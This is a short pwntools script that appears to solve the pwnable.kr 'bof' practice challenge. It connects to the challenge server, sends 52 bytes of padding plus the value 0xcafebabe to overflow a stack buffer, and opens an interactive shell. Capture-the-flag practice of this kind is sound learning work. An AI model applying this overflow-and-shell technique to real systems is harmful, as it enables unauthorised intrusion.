from pwn import*

# io = process('./bof')

io = remote('pwnable.kr', 9000)


padding = b'A' * 52

key = p32(0xcafebabe)

payload = padding + key

io.sendline(payload)

io.interactive()
